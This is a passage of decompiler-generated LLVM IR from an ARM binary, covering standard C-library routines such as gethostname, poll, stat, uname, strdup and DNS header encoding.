  store i32 %v3_2f61c, i32* %r0.global-to-local, align 4
  %v0_2f620 = load i32, i32* @r5, align 4
  br label %dec_label_pc_2f62c

dec_label_pc_2f62c:                               ; preds = %dec_label_pc_2f604, %dec_label_pc_2f5f0, %dec_label_pc_2f614
  %storemerge1 = phi i32 [ %v0_2f620, %dec_label_pc_2f614 ], [ %v0_2f398, %dec_label_pc_2f604 ], [ %v0_2f398, %dec_label_pc_2f5f0 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  %v3_2f62c = load i32, i32* %stack_var_0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_2f634 = load i32, i32* @r7, align 4
  %v2_2f634 = inttoptr i32 %v3_2f62c to i32*
  store i32 %v0_2f634, i32* %v2_2f634, align 4
  store i32 %tmp17, i32* @ip, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_2f640 = load i32, i32* @r7, align 4
  %v2_2f640 = add i32 %v1_2f640, 8
  %v3_2f640 = inttoptr i32 %v2_2f640 to i32*
  store i32 2, i32* %v3_2f640, align 4
  %v0_2f644 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_2f644, i32* @r5, align 4
  %v0_2f648 = load i32, i32* %r2.global-to-local, align 4
  %v2_2f648 = mul i32 %v0_2f648, 2
  store i32 %v2_2f648, i32* %r2.global-to-local, align 4
  %v1_2f64c = load i32, i32* @r7, align 4
  %v2_2f64c = add i32 %v1_2f64c, 12
  %v3_2f64c = inttoptr i32 %v2_2f64c to i32*
  store i32 %v2_2f648, i32* %v3_2f64c, align 4
  %v0_2f650 = load i32, i32* @r7, align 4
  %v1_2f650 = inttoptr i32 %v0_2f650 to i32*
  %v2_2f650 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_2f650, i32* %v1_2f650, align 4
  %v3_2f650 = add i32 %v0_2f650, 4
  %v4_2f650 = inttoptr i32 %v3_2f650 to i32*
  %v5_2f650 = load i32, i32* @sb, align 4
  store i32 %v5_2f650, i32* %v4_2f650, align 4
  %v0_2f654 = load i32, i32* @r6, align 4
  %v1_2f654 = load i32, i32* @r7, align 4
  %v2_2f654 = add i32 %v1_2f654, 16
  %v3_2f654 = inttoptr i32 %v2_2f654 to i32*
  store i32 %v0_2f654, i32* %v3_2f654, align 4
  %v0_2f658 = load i32, i32* %r3.global-to-local, align 4
  %v1_2f658 = load i32, i32* @ip, align 4
  %v2_2f658 = inttoptr i32 %v1_2f658 to i32*
  store i32 %v0_2f658, i32* %v2_2f658, align 4
  br label %dec_label_pc_2f680

dec_label_pc_2f660:                               ; preds = %dec_label_pc_2f57c
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_2f408, align 4
  store i32 %v0_2f45c, i32* @ip, align 4
  %v3_2f674 = load i32, i32* @global_var_428f0.3141, align 4
  store i32 %v3_2f674, i32* %r3.global-to-local, align 4
  %v0_2f678 = load i32, i32* %r2.global-to-local, align 4
  %v3_2f678 = add i32 %v3_2f674, %v0_2f45c
  %v4_2f678 = inttoptr i32 %v3_2f678 to i32*
  store i32 %v0_2f678, i32* %v4_2f678, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_2f680

dec_label_pc_2f680:                               ; preds = %bb35, %dec_label_pc_2f62c, %dec_label_pc_2f660
  %v3_2f680 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_2f680, i32* @r0, align 4
  %v0_2f684 = call i32 @free()
  %v3_2f688 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_2f688, i32* @r0, align 4
  %v0_2f68c = call i32 @free()
  store i32 %v0_2f68c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f694:                               ; preds = %dec_label_pc_2f458, %dec_label_pc_2f48c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_2f698

dec_label_pc_2f698:                               ; preds = %bb, %.thread4, %dec_label_pc_2f43c, %dec_label_pc_2f41c, %dec_label_pc_2f680, %dec_label_pc_2f568, %dec_label_pc_2f4f0, %dec_label_pc_2f694
  %v0_2f698 = load i32, i32* @r5, align 4
  store i32 %v0_2f698, i32* %r0.global-to-local, align 4
  ret i32 %v0_2f698

; uselistorder directives
  uselistorder i32 %v2_2f648, { 1, 0 }
  uselistorder i32 %v0_2f604, { 1, 0 }
  uselistorder i32 %v1_2f5e0, { 0, 2, 1 }
  uselistorder i32 %v1_2f5dc, { 1, 0 }
  uselistorder i32 %v0_2f5ac, { 1, 0, 2 }
  uselistorder i32 %v2_2f5a0, { 1, 0 }
  uselistorder i32 %v1_2f4ac, { 2, 1, 0 }
  uselistorder i32 %v1_2f4a0, { 1, 0 }
  uselistorder i32 %v0_2f478, { 1, 0 }
  uselistorder i32 %v0_2f45c, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_2f408, { 1, 0, 2 }
  uselistorder i32 %v0_2f3b0, { 1, 0, 2 }
  uselistorder i32 %v0_2f398, { 1, 2, 3, 5, 4, 0, 6, 7 }
  uselistorder i32 %v0_2f390, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32 %tmp17, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 19, 20, 4, 3, 6, 5, 8, 7, 0, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 22, 21, 20, 19, 18, 17, 11, 10, 9, 8, 7, 6, 16, 15, 14, 13, 5, 4, 3, 2, 12, 23, 30, 29, 28, 1, 27, 26, 25, 24, 0 }
  uselistorder i32* @global_var_428f0.3141, { 1, 2, 0, 3, 4 }
  uselistorder i32 (i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_2f698, { 7, 4, 5, 6, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_2f694, { 1, 0 }
  uselistorder label %dec_label_pc_2f680, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2f62c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2f5d8, { 1, 0 }
  uselistorder label %dec_label_pc_2f458, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_2f6c0 = load i32, i32* @r1, align 4
  %v2_2f6c0 = icmp eq i32 %v0_2f6c0, 0
  %v3_2f6c4 = load i32, i32* @r4, align 4
  store i32 %v3_2f6c4, i32* %stack_var_-8, align 4
  %v0_2f6c8 = load i32, i32* @r0, align 4
  store i32 %v0_2f6c8, i32* %r4.global-to-local, align 4
  br i1 %v2_2f6c0, label %dec_label_pc_2f6ec, label %dec_label_pc_2f6d0

dec_label_pc_2f6d0:                               ; preds = %entry
  %v1_2f6d8 = add i32 %v0_2f6c8, 260
  %v4_2f6dc = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_2f6d8)
  %v2_2f6e0 = icmp eq i32 %v4_2f6dc, 0
  br i1 %v2_2f6e0, label %dec_label_pc_2f6f0, label %dec_label_pc_2f6ec

dec_label_pc_2f6ec:                               ; preds = %dec_label_pc_2f6d0, %entry
  br label %dec_label_pc_2f6f0

dec_label_pc_2f6f0:                               ; preds = %dec_label_pc_2f6d0, %dec_label_pc_2f6ec
  %storemerge = phi i32 [ 0, %dec_label_pc_2f6ec ], [ 1, %dec_label_pc_2f6d0 ]
  %v1_2f6f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_2f6f4 = add i32 %v1_2f6f4, 256
  %v3_2f6f4 = inttoptr i32 %v2_2f6f4 to i32*
  store i32 %storemerge, i32* %v3_2f6f4, align 4
  %v2_2f6f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_2f6f8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32* null, { 7, 2, 3, 0, 4, 1, 5, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 18, 19, 20, 26, 27, 24, 25, 23, 22, 21, 28, 29, 30, 6 }
  uselistorder label %dec_label_pc_2f6f0, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_2f70c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_2f718 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2f718, i32* %r5.global-to-local, align 4
  %v1_2f71c = call i32 @uname(i32 %v2_2f70c)
  %v7_2f720 = icmp eq i32 %v1_2f71c, -1
  br i1 %v7_2f720, label %bb, label %dec_label_pc_2f72c

bb:                                               ; preds = %entry
  store i32 %v1_2f71c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f770

dec_label_pc_2f72c:                               ; preds = %entry
  %v2_2f72c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_2f734 = call i32 @strlen(i8* %tmp10)
  %v1_2f738 = add i32 %v3_2f734, 1
  %v1_2f73c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_2f738, %v1_2f73c
  br i1 %tmp, label %dec_label_pc_2f744, label %dec_label_pc_2f760

dec_label_pc_2f744:                               ; preds = %dec_label_pc_2f72c
  %v0_2f748 = call i32 @__aeabi_read_tp()
  %v3_2f74c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f74c = sext i16 %v3_2f74c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2f758 = add i32 %v4_2f74c, %v0_2f748
  %v4_2f758 = inttoptr i32 %v3_2f758 to i32*
  store i32 22, i32* %v4_2f758, align 4
  %v0_2f770.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f770

dec_label_pc_2f760:                               ; preds = %dec_label_pc_2f72c
  store i32 %v2_2f72c, i32* @r1, align 4
  %v0_2f764 = load i32, i32* %r6.global-to-local, align 4
  %v2_2f768 = inttoptr i32 %v0_2f764 to i8*
  %v3_2f768 = call i32 @strcpy(i8* %v2_2f768, i32 %v2_2f72c)
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f770

dec_label_pc_2f770:                               ; preds = %bb, %dec_label_pc_2f744, %dec_label_pc_2f760
  %v0_2f770 = phi i32 [ %v1_2f71c, %bb ], [ %v0_2f770.pre, %dec_label_pc_2f744 ], [ 0, %dec_label_pc_2f760 ]
  ret i32 %v0_2f770

; uselistorder directives
  uselistorder i32 %v2_2f72c, { 1, 0 }
  uselistorder i32 %v1_2f71c, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 3, 15, 4, 17, 5, 18, 0, 16, 6, 7, 8, 9, 13, 10, 11, 19, 12, 1, 2, 14 }
  uselistorder label %dec_label_pc_2f770, { 2, 1, 0 }
}

define i32 @__syscall_poll() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2f784 = load i32, i32* @r7, align 4
  store i32 %v3_2f784, i32* %stack_var_-8, align 4
  %v0_2f790 = load i32, i32* @r0, align 4
  store i32 %v0_2f790, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2f790, -4095
  br i1 %tmp, label %dec_label_pc_2f7b8, label %dec_label_pc_2f7a0

dec_label_pc_2f7a0:                               ; preds = %entry
  %v0_2f7a4 = call i32 @__aeabi_read_tp()
  %v3_2f7a8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f7a8 = sext i16 %v3_2f7a8 to i32
  %v0_2f7ac = load i32, i32* %r2.global-to-local, align 4
  %v1_2f7ac = sub i32 0, %v0_2f7ac
  store i32 %v1_2f7ac, i32* %r2.global-to-local, align 4
  %v3_2f7b0 = add i32 %v4_2f7a8, %v0_2f7a4
  %v4_2f7b0 = inttoptr i32 %v3_2f7b0 to i32*
  store i32 %v1_2f7ac, i32* %v4_2f7b0, align 4
  %v2_2f7b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2f7b8

dec_label_pc_2f7b8:                               ; preds = %entry, %dec_label_pc_2f7a0
  %v1_2f7bc = phi i32 [ %v0_2f790, %entry ], [ -1, %dec_label_pc_2f7a0 ]
  %v2_2f7b8 = phi i32 [ %v3_2f784, %entry ], [ %v2_2f7b8.pre, %dec_label_pc_2f7a0 ]
  store i32 %v2_2f7b8, i32* @r7, align 4
  ret i32 %v1_2f7bc

; uselistorder directives
  uselistorder i32 %v0_2f790, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2f7b8, { 1, 0 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_2f7c8 = load i32, i32* @r4, align 4
  store i32 %v3_2f7c8, i32* %stack_var_-20, align 4
  %v6_2f7c8 = load i32, i32* @r5, align 4
  %v9_2f7c8 = load i32, i32* @r6, align 4
  %v12_2f7c8 = load i32, i32* @r7, align 4
  %v4_2f7d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_2f7d8 = icmp eq i32 %v4_2f7d4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_2f7d8, label %dec_label_pc_2f7f0, label %entry.dec_label_pc_2f7fc_crit_edge

entry.dec_label_pc_2f7fc_crit_edge:               ; preds = %entry
  br label %dec_label_pc_2f7fc

dec_label_pc_2f7f0:                               ; preds = %entry
  store i32 %v3_2f7c8, i32* @r4, align 4
  store i32 %v9_2f7c8, i32* @r6, align 4
  store i32 %v12_2f7c8, i32* @r7, align 4
  %v0_2f7f8 = call i32 @__syscall_poll()
  br label %dec_label_pc_2f7fc

dec_label_pc_2f7fc:                               ; preds = %entry.dec_label_pc_2f7fc_crit_edge, %dec_label_pc_2f7f0
  %v0_2f7fc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_2f7fc, i32* @r5, align 4
  %v0_2f80c = load i32, i32* @r4, align 4
  store i32 %v0_2f80c, i32* @r0, align 4
  %v0_2f810 = call i32 @__syscall_poll()
  store i32 %v0_2f810, i32* @r4, align 4
  %v0_2f818 = load i32, i32* @r5, align 4
  %v1_2f81c = call i32 @__libc_disable_asynccancel(i32 %v0_2f818)
  %v0_2f820 = load i32, i32* @r4, align 4
  %v2_2f828 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2f828, i32* @r4, align 4
  store i32 %v6_2f7c8, i32* @r5, align 4
  store i32 %v9_2f7c8, i32* @r6, align 4
  store i32 %v12_2f7c8, i32* @r7, align 4
  ret i32 %v0_2f820

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 11, 13, 12, 6, 2, 1, 4, 14, 3, 8, 9, 5, 7, 10, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 11, 13, 12, 6, 2, 1, 4, 14, 3, 8, 9, 5, 7, 10, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_2f7fc, { 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 195, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_2f878, label %dec_label_pc_2f85c

dec_label_pc_2f85c:                               ; preds = %entry
  %v0_2f860 = call i32 @__aeabi_read_tp()
  %v3_2f864 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f864 = sext i16 %v3_2f864 to i32
  %v0_2f868 = load i32, i32* %r2.global-to-local, align 4
  %v1_2f868 = sub i32 0, %v0_2f868
  store i32 %v1_2f868, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_2f870 = add i32 %v4_2f864, %v0_2f860
  %v4_2f870 = inttoptr i32 %v3_2f870 to i32*
  store i32 %v1_2f868, i32* %v4_2f870, align 4
  br label %dec_label_pc_2f888

dec_label_pc_2f878:                               ; preds = %entry
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %v2_2f878 = icmp eq i32 %arg1, 0
  br i1 %v2_2f878, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_2f878
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_2f878, %bb
  call void @__pseudo_cond_branch(i1 %v2_2f878, i32 ptrtoint (i32* @global_var_2d6ec.3520 to i32))
  br label %dec_label_pc_2f888

dec_label_pc_2f888:                               ; preds = %dec_label_pc_2f85c, %.thread
  %v0_2f888 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_2f888

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_2f888, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @uname(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2f89c = load i32, i32* @r7, align 4
  store i32 %v3_2f89c, i32* %stack_var_-8, align 4
  %v0_2f8a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2f8a8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2f8a8, -4095
  br i1 %tmp, label %dec_label_pc_2f8d0, label %dec_label_pc_2f8b8

dec_label_pc_2f8b8:                               ; preds = %entry
  %v0_2f8bc = call i32 @__aeabi_read_tp()
  %v3_2f8c0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f8c0 = sext i16 %v3_2f8c0 to i32
  %v0_2f8c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_2f8c4 = sub i32 0, %v0_2f8c4
  store i32 %v1_2f8c4, i32* %r2.global-to-local, align 4
  %v3_2f8c8 = add i32 %v4_2f8c0, %v0_2f8bc
  %v4_2f8c8 = inttoptr i32 %v3_2f8c8 to i32*
  store i32 %v1_2f8c4, i32* %v4_2f8c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_2f8d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_2f8d0

dec_label_pc_2f8d0:                               ; preds = %entry, %dec_label_pc_2f8b8
  %v1_2f8d4 = phi i32 [ %v0_2f8a8, %entry ], [ -1, %dec_label_pc_2f8b8 ]
  %v2_2f8d0 = phi i32 [ %v3_2f89c, %entry ], [ %v2_2f8d0.pre, %dec_label_pc_2f8b8 ]
  store i32 %v2_2f8d0, i32* @r7, align 4
  ret i32 %v1_2f8d4

; uselistorder directives
  uselistorder i32 %v0_2f8a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2f8d0, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_2f924, label %dec_label_pc_2f908

dec_label_pc_2f908:                               ; preds = %entry
  %v0_2f90c = call i32 @__aeabi_read_tp()
  %v3_2f910 = load i16, i16* @global_var_42934.3040, align 2
  %v4_2f910 = sext i16 %v3_2f910 to i32
  %v0_2f914 = load i32, i32* %r2.global-to-local, align 4
  %v1_2f914 = sub i32 0, %v0_2f914
  store i32 %v1_2f914, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2f91c = add i32 %v4_2f910, %v0_2f90c
  %v4_2f91c = inttoptr i32 %v3_2f91c to i32*
  store i32 %v1_2f914, i32* %v4_2f91c, align 4
  %v0_2f92c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2f92c

dec_label_pc_2f924:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_2f924 = icmp eq i32 %arg1, 0
  br i1 %v2_2f924, label %dec_label_pc_2f938, label %dec_label_pc_2f92c

dec_label_pc_2f92c:                               ; preds = %dec_label_pc_2f924, %dec_label_pc_2f908
  %v0_2f92c = phi i32 [ %arg1, %dec_label_pc_2f924 ], [ %v0_2f92c.pre, %dec_label_pc_2f908 ]
  %v3_2f930 = ashr i32 %v0_2f92c, 31
  br label %dec_label_pc_2f93c

dec_label_pc_2f938:                               ; preds = %dec_label_pc_2f924
  br label %dec_label_pc_2f93c

dec_label_pc_2f93c:                               ; preds = %dec_label_pc_2f92c, %dec_label_pc_2f938
  %v1_2f944 = phi i32 [ %v0_2f92c, %dec_label_pc_2f92c ], [ %tmp8, %dec_label_pc_2f938 ]
  %storemerge = phi i32 [ %v3_2f930, %dec_label_pc_2f92c ], [ %tmp, %dec_label_pc_2f938 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_2f944

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 5, 0 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_2f93c, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_2f950 = load i32, i32* @r0, align 4
  %v1_2f950 = load i32, i32* @r1, align 4
  %v2_2f950 = inttoptr i32 %v0_2f950 to i8*
  %v3_2f950 = call i32 @_memcpy(i8* %v2_2f950, i32 %v1_2f950)
  ret i32 %v3_2f950

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_2f960 = load i32, i32* @r4, align 4
  store i32 %v3_2f960, i32* %stack_var_-16, align 4
  %v9_2f960 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_2f968 = call i32 @strlen(i8* %arg1)
  %v1_2f96c = add i32 %v3_2f968, 1
  store i32 %v1_2f96c, i32* @r4, align 4
  %v1_2f974 = call i32 @malloc(i32 %v1_2f96c)
  store i32 %v1_2f974, i32* %r5.global-to-local, align 4
  %v2_2f978 = icmp eq i32 %v1_2f974, 0
  br i1 %v2_2f978, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_2f984 = xor i1 %v2_2f978, true
  call void @__pseudo_cond_branch(i1 %v1_2f984, i32 ptrtoint (i32* @global_var_24950.3330 to i32))
  %v0_2f988 = load i32, i32* %r5.global-to-local, align 4
  %v2_2f98c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2f98c, i32* @r4, align 4
  store i32 %v9_2f960, i32* @r6, align 4
  ret i32 %v0_2f988

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 11, 10, 9, 3, 8, 7, 4, 21, 1, 20, 19, 18, 17, 16, 15, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_2f998 = load i32, i32* @lr, align 4
  store i32 %v0_2f998, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* @ip, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_2f9a4 = icmp sgt i32 %arg3, 11
  br i1 %v7_2f9a4, label %dec_label_pc_2f9ac, label %dec_label_pc_2fa78

dec_label_pc_2f9ac:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_2f9ac = add i32 %tmp, 1
  %v2_2f9ac = inttoptr i32 %v1_2f9ac to i8*
  %v3_2f9ac = load i8, i8* %v2_2f9ac, align 1
  store i8 %v3_2f9ac, i8* %tmp16, align 1
  %v0_2f9b4 = load i32, i32* @ip, align 4
  %v1_2f9b4 = inttoptr i32 %v0_2f9b4 to i32*
  %v2_2f9b4 = load i32, i32* %v1_2f9b4, align 4
  %v1_2f9b8 = trunc i32 %v2_2f9b4 to i8
  %v4_2f9b8 = add i32 %arg2, 1
  %v5_2f9b8 = inttoptr i32 %v4_2f9b8 to i8*
  store i8 %v1_2f9b8, i8* %v5_2f9b8, align 1
  %v0_2f9bc = load i32, i32* @ip, align 4
  %v1_2f9bc = add i32 %v0_2f9bc, 8
  %v2_2f9bc = inttoptr i32 %v1_2f9bc to i32*
  %v3_2f9bc = load i32, i32* %v2_2f9bc, align 4
  %v1_2f9c0 = add i32 %v0_2f9bc, 20
  %v2_2f9c0 = inttoptr i32 %v1_2f9c0 to i32*
  %v3_2f9c0 = load i32, i32* %v2_2f9c0, align 4
  %v1_2f9c4 = add i32 %v0_2f9bc, 4
  %v2_2f9c4 = inttoptr i32 %v1_2f9c4 to i32*
  %v3_2f9c4 = load i32, i32* %v2_2f9c4, align 4
  %v1_2f9c8 = add i32 %v0_2f9bc, 12
  %v2_2f9c8 = inttoptr i32 %v1_2f9c8 to i32*
  %v3_2f9c8 = load i32, i32* %v2_2f9c8, align 4
  %v2_2f9cc = icmp eq i32 %v3_2f9c0, 0
  br i1 %v2_2f9cc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_2f9ac
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_2f9ac, %bb
  %v0_2f9dc = phi i32 [ 0, %dec_label_pc_2f9ac ], [ 1, %bb ]
  %v1_2f9d4 = urem i32 %v3_2f9bc, 16
  %v2_2f9d8 = icmp eq i32 %v3_2f9c4, 0
  %v4_2f9dc = mul nuw nsw i32 %v1_2f9d4, 8
  %v5_2f9dc = or i32 %v0_2f9dc, %v4_2f9dc
  %v1_2f9e0 = add i32 %v0_2f9bc, 16
  %v2_2f9e0 = inttoptr i32 %v1_2f9e0 to i32*
  %v3_2f9e0 = load i32, i32* %v2_2f9e0, align 4
  %. = select i1 %v2_2f9d8, i32 0, i32 128
  %v2_2f9ec = icmp eq i32 %v3_2f9c8, 0
  %storemerge11 = select i1 %v2_2f9ec, i32 0, i32 4
  %v2_2f9f8 = or i32 %v5_2f9dc, %.
  %v2_2f9fc = icmp eq i32 %v3_2f9e0, 0
  %.26 = select i1 %v2_2f9fc, i32 0, i32 2
  %v2_2fa08 = or i32 %v2_2f9f8, %storemerge11
  %v2_2fa0c = or i32 %v2_2fa08, %.26
  %v1_2fa10 = trunc i32 %v2_2fa0c to i8
  %v2_2fa10 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa10 = add i32 %v2_2fa10, 2
  %v4_2fa10 = inttoptr i32 %v3_2fa10 to i8*
  store i8 %v1_2fa10, i8* %v4_2fa10, align 1
  %v0_2fa14 = load i32, i32* @ip, align 4
  %v1_2fa14 = add i32 %v0_2fa14, 24
  %v1_2fa18 = inttoptr i32 %v1_2fa14 to i32*
  %v2_2fa18 = load i32, i32* %v1_2fa18, align 4
  %v3_2fa18 = add i32 %v0_2fa14, 28
  %v4_2fa18 = inttoptr i32 %v3_2fa18 to i32*
  %v5_2fa18 = load i32, i32* %v4_2fa18, align 4
  %v2_2fa1c = icmp eq i32 %v2_2fa18, 0
  %v1_2fa20 = urem i32 %v5_2fa18, 16
  %v0_2fa2c = select i1 %v2_2fa1c, i32 0, i32 128
  %v2_2fa2c = or i32 %v1_2fa20, %v0_2fa2c
  %v1_2fa30 = trunc i32 %v2_2fa2c to i8
  %v2_2fa30 = load i32, i32* %lr.global-to-local, align 4
  %v3_2fa30 = add i32 %v2_2fa30, 3
  %v4_2fa30 = inttoptr i32 %v3_2fa30 to i8*
  store i8 %v1_2fa30, i8* %v4_2fa30, align 1
